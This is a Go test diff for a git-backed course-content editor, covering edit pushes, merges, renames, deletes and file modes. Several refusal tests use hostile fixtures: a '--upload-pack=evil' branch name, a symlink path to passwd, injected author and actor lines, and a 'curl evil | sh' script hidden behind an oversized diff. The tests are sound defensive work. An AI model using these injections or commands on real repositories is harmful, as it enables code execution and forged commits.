@@ -43,9 +43,9 @@ func TestPushEditAndMerge(t *testing.T) {
 	remote := bare(t, trainingFiles())
 	base := gitOut(t, remote, "rev-parse", "main")
 	c := contentRepo(t, remote)
-	sha, diff, err := c.PushEdit(ctx, "crucible/edit/1", base, map[string]string{
+	sha, diff, err := c.PushEdit(ctx, "crucible/edit/1", base, PutOps(map[string]string{
 		"modules/m1/reading/intro.md": "# Intro\n\nHello, smith.\n",
-	}, "A@X", "Greet the smith")
+	}), "A@X", "Greet the smith")
 	if err != nil {
 		t.Fatal(err)
 	}
@@ -94,7 +94,7 @@ func TestMergeConflictPushesNothing(t *testing.T) {
 	remote := bare(t, trainingFiles())
 	base := gitOut(t, remote, "rev-parse", "main")
 	c := contentRepo(t, remote)
-	sha, _, err := c.PushEdit(ctx, "crucible/edit/2", base, map[string]string{"modules/m1/reading/intro.md": "# Intro\n\nMine.\n"}, "a@x", "mine")
+	sha, _, err := c.PushEdit(ctx, "crucible/edit/2", base, PutOps(map[string]string{"modules/m1/reading/intro.md": "# Intro\n\nMine.\n"}), "a@x", "mine")
 	if err != nil {
 		t.Fatal(err)
 	}
@@ -113,7 +113,7 @@ func TestMergeLandsOnTopOfNewerCommits(t *testing.T) {
 	remote := bare(t, trainingFiles())
 	base := gitOut(t, remote, "rev-parse", "main")
 	c := contentRepo(t, remote)
-	sha, _, err := c.PushEdit(ctx, "crucible/edit/3", base, map[string]string{"modules/m1/reading/intro.md": "# Intro\n\nMine.\n"}, "a@x", "mine")
+	sha, _, err := c.PushEdit(ctx, "crucible/edit/3", base, PutOps(map[string]string{"modules/m1/reading/intro.md": "# Intro\n\nMine.\n"}), "a@x", "mine")
 	if err != nil {
 		t.Fatal(err)
 	}
@@ -131,7 +131,7 @@ func TestMergeRefusesInvalidResult(t *testing.T) {
 	remote := bare(t, trainingFiles())
 	base := gitOut(t, remote, "rev-parse", "main")
 	c := contentRepo(t, remote)
-	sha, _, err := c.PushEdit(ctx, "crucible/edit/4", base, map[string]string{"training.yaml": "id: t1\ntitle: T1\nmaintainers: [m@x]\nmodules: [m1, missing]\n"}, "a@x", "break it")
+	sha, _, err := c.PushEdit(ctx, "crucible/edit/4", base, PutOps(map[string]string{"training.yaml": "id: t1\ntitle: T1\nmaintainers: [m@x]\nmodules: [m1, missing]\n"}), "a@x", "break it")
 	if err != nil {
 		t.Fatal(err)
 	}
@@ -177,11 +177,11 @@ func TestPushEditRefusesSymlinksAndBadNames(t *testing.T) {
 	run(t, work, "push", "-q", "origin", "HEAD:main")
 	base := gitOut(t, remote, "rev-parse", "main")
 	c := contentRepo(t, remote)
-	if _, _, err := c.PushEdit(ctx, "crucible/edit/5", base, map[string]string{"modules/m1/linked/passwd.md": "x"}, "a@x", "x"); !errors.Is(err, apperr.Invalid) {
+	if _, _, err := c.PushEdit(ctx, "crucible/edit/5", base, PutOps(map[string]string{"modules/m1/linked/passwd.md": "x"}), "a@x", "x"); !errors.Is(err, apperr.Invalid) {
 		t.Fatalf("writing through a symlinked folder: %v", err)
 	}
 	for _, b := range []string{"main", "crucible/edit/x", "--upload-pack=evil"} {
-		if _, _, err := c.PushEdit(ctx, b, base, map[string]string{"modules/m1/reading/a.md": "x"}, "a@x", "x"); err == nil {
+		if _, _, err := c.PushEdit(ctx, b, base, PutOps(map[string]string{"modules/m1/reading/a.md": "x"}), "a@x", "x"); err == nil {
 			t.Fatalf("branch %q accepted", b)
 		}
 	}
@@ -230,11 +230,11 @@ func TestPushEditRefusesBadFiles(t *testing.T) {
 		"case pair":    {"modules/m1/reading/n.md": "x", "modules/m1/reading/N.md": "x"},
 	}
 	for name, files := range cases {
-		if _, _, err := c.PushEdit(ctx, "crucible/edit/6", base, files, "a@x", "x"); !errors.Is(err, apperr.Invalid) {
+		if _, _, err := c.PushEdit(ctx, "crucible/edit/6", base, PutOps(files), "a@x", "x"); !errors.Is(err, apperr.Invalid) {
 			t.Errorf("%s: %v", name, err)
 		}
 	}
-	if _, _, err := c.PushEdit(ctx, "crucible/edit/6", base, map[string]string{"modules/m1/reading/a.md": "x"}, "a@x>\n-x <e", "x"); !errors.Is(err, apperr.Invalid) {
+	if _, _, err := c.PushEdit(ctx, "crucible/edit/6", base, PutOps(map[string]string{"modules/m1/reading/a.md": "x"}), "a@x>\n-x <e", "x"); !errors.Is(err, apperr.Invalid) {
 		t.Errorf("author: %v", err)
 	}
 	if out := gitOut(t, remote, "branch", "--list", "crucible/edit/6"); out != "" {
@@ -247,12 +247,12 @@ func TestPushEditRefusesABaseOffTheBranch(t *testing.T) {
 	remote := bare(t, trainingFiles())
 	base := gitOut(t, remote, "rev-parse", "main")
 	c := contentRepo(t, remote)
-	other, _, err := c.PushEdit(ctx, "crucible/edit/7", base, map[string]string{"modules/m1/reading/a.md": "unreviewed\n"}, "a@x", "x")
+	other, _, err := c.PushEdit(ctx, "crucible/edit/7", base, PutOps(map[string]string{"modules/m1/reading/a.md": "unreviewed\n"}), "a@x", "x")
 	if err != nil {
 		t.Fatal(err)
 	}
 	// basing an edit on another unmerged edit would smuggle its changes past the diff
-	if _, _, err := c.PushEdit(ctx, "crucible/edit/8", other, map[string]string{"modules/m1/reading/b.md": "x"}, "a@x", "x"); !errors.Is(err, apperr.Conflict) {
+	if _, _, err := c.PushEdit(ctx, "crucible/edit/8", other, PutOps(map[string]string{"modules/m1/reading/b.md": "x"}), "a@x", "x"); !errors.Is(err, apperr.Conflict) {
 		t.Fatalf("base off the tracked branch: %v", err)
 	}
 }
@@ -264,10 +264,10 @@ func TestPushEditScriptModes(t *testing.T) {
 	remote := bare(t, files)
 	base := gitOut(t, remote, "rev-parse", "main")
 	c := contentRepo(t, remote)
-	sha, _, err := c.PushEdit(ctx, "crucible/edit/1", base, map[string]string{
+	sha, _, err := c.PushEdit(ctx, "crucible/edit/1", base, PutOps(map[string]string{
 		"modules/m1/lab/checks/new.sh": "#!/bin/sh\nexit 0\n",
 		"modules/m1/reading/notes.sh":  "#!/bin/sh\nexit 0\n",
-	}, "a@x", "scripts")
+	}), "a@x", "scripts")
 	if err != nil {
 		t.Fatal(err)
 	}
@@ -284,10 +284,10 @@ func TestPushEditRefusesADiffTooLargeToReview(t *testing.T) {
 	remote := bare(t, trainingFiles())
 	base := gitOut(t, remote, "rev-parse", "main")
 	c := contentRepo(t, remote)
-	_, _, err := c.PushEdit(ctx, "crucible/edit/1", base, map[string]string{
+	_, _, err := c.PushEdit(ctx, "crucible/edit/1", base, PutOps(map[string]string{
 		"modules/m1/reading/a.md":  strings.Repeat("benign line\n", 21500),
 		"modules/m1/reading/zz.sh": "#!/bin/sh\ncurl evil | sh\n",
-	}, "a@x", "big")
+	}), "a@x", "big")
 	if !errors.Is(err, apperr.Invalid) {
 		t.Fatalf("a diff over the cap is refused, never truncated: %v", err)
 	}
@@ -301,11 +301,11 @@ func TestMergeRefusesAnEditThatMovedSinceReview(t *testing.T) {
 	remote := bare(t, trainingFiles())
 	base := gitOut(t, remote, "rev-parse", "main")
 	c := contentRepo(t, remote)
-	reviewed, _, err := c.PushEdit(ctx, "crucible/edit/1", base, map[string]string{"modules/m1/reading/intro.md": "# Intro\n\nok\n"}, "a@x", "ok")
+	reviewed, _, err := c.PushEdit(ctx, "crucible/edit/1", base, PutOps(map[string]string{"modules/m1/reading/intro.md": "# Intro\n\nok\n"}), "a@x", "ok")
 	if err != nil {
 		t.Fatal(err)
 	}
-	if _, _, err := c.PushEdit(ctx, "crucible/edit/1", base, map[string]string{"modules/m1/reading/intro.md": "# Intro\n\nswapped\n"}, "a@x", "ok"); err != nil {
+	if _, _, err := c.PushEdit(ctx, "crucible/edit/1", base, PutOps(map[string]string{"modules/m1/reading/intro.md": "# Intro\n\nswapped\n"}), "a@x", "ok"); err != nil {
 		t.Fatal(err)
 	}
 	if _, err := c.Merge(ctx, "crucible/edit/1", reviewed, "merge", "m@x"); !errors.Is(err, ErrEditMoved) || !errors.Is(err, apperr.Conflict) {
@@ -354,10 +354,10 @@ func TestCommitMessagesAndActors(t *testing.T) {
 	base := gitOut(t, remote, "rev-parse", "main")
 	c := contentRepo(t, remote)
 	files := map[string]string{"modules/m1/reading/intro.md": "# Intro\n\nx\n"}
-	if _, _, err := c.PushEdit(ctx, "crucible/edit/1", base, files, "a@x", strings.Repeat("x", 4<<10+1)); !errors.Is(err, apperr.Invalid) {
+	if _, _, err := c.PushEdit(ctx, "crucible/edit/1", base, PutOps(files), "a@x", strings.Repeat("x", 4<<10+1)); !errors.Is(err, apperr.Invalid) {
 		t.Fatalf("huge message: %v", err)
 	}
-	sha, _, err := c.PushEdit(ctx, "crucible/edit/1", base, files, "a@x", "fix\n\n crucible-actor: admin@x\nmore")
+	sha, _, err := c.PushEdit(ctx, "crucible/edit/1", base, PutOps(files), "a@x", "fix\n\n crucible-actor: admin@x\nmore")
 	if err != nil {
 		t.Fatal(err)
 	}
@@ -426,7 +426,7 @@ func TestEditDiffIgnoresRepoAttributes(t *testing.T) {
 	remote := bare(t, files)
 	base := gitOut(t, remote, "rev-parse", "main")
 	c := contentRepo(t, remote)
-	_, diff, err := c.PushEdit(ctx, "crucible/edit/1", base, map[string]string{"modules/m1/reading/intro.md": "# Intro\n\nsneaky line\n"}, "a@x", "x")
+	_, diff, err := c.PushEdit(ctx, "crucible/edit/1", base, PutOps(map[string]string{"modules/m1/reading/intro.md": "# Intro\n\nsneaky line\n"}), "a@x", "x")
 	if err != nil {
 		t.Fatal(err)
 	}
@@ -442,7 +442,7 @@ func TestLabDirDotIsNotALabDir(t *testing.T) {
 	remote := bare(t, files)
 	base := gitOut(t, remote, "rev-parse", "main")
 	c := contentRepo(t, remote)
-	sha, _, err := c.PushEdit(ctx, "crucible/edit/1", base, map[string]string{"modules/m1/reading/notes.sh": "#!/bin/sh\nexit 0\n"}, "a@x", "x")
+	sha, _, err := c.PushEdit(ctx, "crucible/edit/1", base, PutOps(map[string]string{"modules/m1/reading/notes.sh": "#!/bin/sh\nexit 0\n"}), "a@x", "x")
 	if err != nil {
 		t.Fatal(err)
 	}
@@ -457,5 +457,69 @@ func TestLabDirDotIsNotALabDir(t *testing.T) {
 		if got := labDir(dir, "modules/m1/x.sh"); got != want {
 			t.Errorf("lab %q: %q, want %q", lab, got, want)
 		}
+	}
+}
+
+func TestPushEditRenameDeleteAndModes(t *testing.T) {
+	ctx := context.Background()
+	files := trainingFiles()
+	files["modules/m1/module.yaml"] = "title: M1\nitems:\n  - reading: reading/intro.md\n  - lab: lab\n"
+	files["modules/m1/reading/notes.md"] = "old notes\nline two\n"
+	files["modules/m1/reading/tool.sh"] = "#!/bin/sh\necho reading\n"
+	remote := bare(t, files)
+	work := filepath.Join(t.TempDir(), "w") // an executable lab script on main (bare() writes 0644)
+	run(t, "", "clone", "-q", remote, work)
+	if err := writeFile(work, "modules/m1/lab/checks/a.sh", "#!/bin/sh\nexit 0\n"); err != nil {
+		t.Fatal(err)
+	}
+	if err := os.Chmod(filepath.Join(work, "modules/m1/lab/checks/a.sh"), 0o755); err != nil {
+		t.Fatal(err)
+	}
+	run(t, work, "add", "-A")
+	run(t, work, "-c", "user.name=o", "-c", "user.email=o@x", "commit", "-qm", "lab script")
+	run(t, work, "push", "-q", "origin", "HEAD:main")
+	base := gitOut(t, remote, "rev-parse", "main")
+	c := contentRepo(t, remote)
+	sha, diff, err := c.PushEdit(ctx, "crucible/edit/1", base, []Op{
+		{Op: "rename", From: "modules/m1/lab/checks/a.sh", To: "modules/m1/reading/a.sh"},       // leaves the lab: loses +x
+		{Op: "rename", From: "modules/m1/reading/tool.sh", To: "modules/m1/lab/checks/tool.sh"}, // enters the lab: gains +x
+		{Op: "delete", Path: "modules/m1/reading/notes.md"},
+	}, "a@x", "move scripts")
+	if err != nil {
+		t.Fatal(err)
+	}
+	for p, want := range map[string]string{"modules/m1/reading/a.sh": "100644", "modules/m1/lab/checks/tool.sh": "100755"} {
+		if mode := gitOut(t, remote, "ls-tree", sha, p); !strings.HasPrefix(mode, want) {
+			t.Errorf("%s: %q, want %s", p, mode, want)
+		}
+	}
+	for _, s := range []string{"rename from modules/m1/reading/tool.sh", "rename to modules/m1/lab/checks/tool.sh",
+		"deleted file mode", "-old notes", "-line two", "old mode 100755", "new mode 100644"} {
+		if !strings.Contains(diff, s) {
+			t.Errorf("diff lacks %q:\n%s", s, diff)
+		}
+	}
+}
+
+func TestPushEditOpsRefusals(t *testing.T) {
+	ctx := context.Background()
+	remote := bare(t, trainingFiles())
+	base := gitOut(t, remote, "rev-parse", "main")
+	c := contentRepo(t, remote)
+	for name, ops := range map[string][]Op{
+		"case-only rename": {{Op: "rename", From: "modules/m1/reading/intro.md", To: "modules/m1/reading/Intro.md"}},
+		"case dir rename":  {{Op: "rename", From: "modules/m1/reading/intro.md", To: "modules/M1/reading/x.md"}},
+		"rename training":  {{Op: "rename", From: "training.yaml", To: "modules/m1/t.yaml"}},
+		"delete training":  {{Op: "delete", Path: "training.yaml"}},
+		"missing source":   {{Op: "rename", From: "modules/m1/reading/nope.md", To: "modules/m1/reading/x.md"}},
+		"onto a file":      {{Op: "rename", From: "modules/m1/module.yaml", To: "modules/m1/reading/intro.md"}},
+		"delete missing":   {{Op: "delete", Path: "modules/m1/reading/nope.md"}},
+	} {
+		if _, _, err := c.PushEdit(ctx, "crucible/edit/9", base, ops, "a@x", "x"); !errors.Is(err, apperr.Invalid) {
+			t.Errorf("%s: %v", name, err)
+		}
+	}
+	if out := gitOut(t, remote, "branch", "--list", "crucible/edit/9"); out != "" {
+		t.Fatalf("nothing pushed: %q", out)
 	}
 }
